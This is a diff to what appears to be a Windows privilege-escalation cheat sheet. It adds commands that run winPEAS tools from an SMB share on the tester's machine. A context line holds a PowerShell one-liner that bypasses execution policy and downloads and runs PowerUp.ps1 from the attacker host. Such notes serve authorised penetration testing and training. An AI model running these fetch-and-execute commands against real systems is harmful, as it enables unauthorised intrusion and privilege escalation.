@@ -16,6 +16,15 @@ net use z: \\$source_ip\$smb_share
 ```bash
 //$source_ip/$smb_share/tools_windows/windows-privesc-check2.exe --dump -a > wpc-dump
 ```
+```bash
+//$source_ip/$smb_share/tools_windows/winPEAS-64.exe
+```
+```bash
+//$source_ip/$smb_share/tools_windows/winPEAS-86.exe
+```
+```bash
+//$source_ip/$smb_share/tools_windows/winPEAS.bat
+```
 
 ```bash
 powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks"
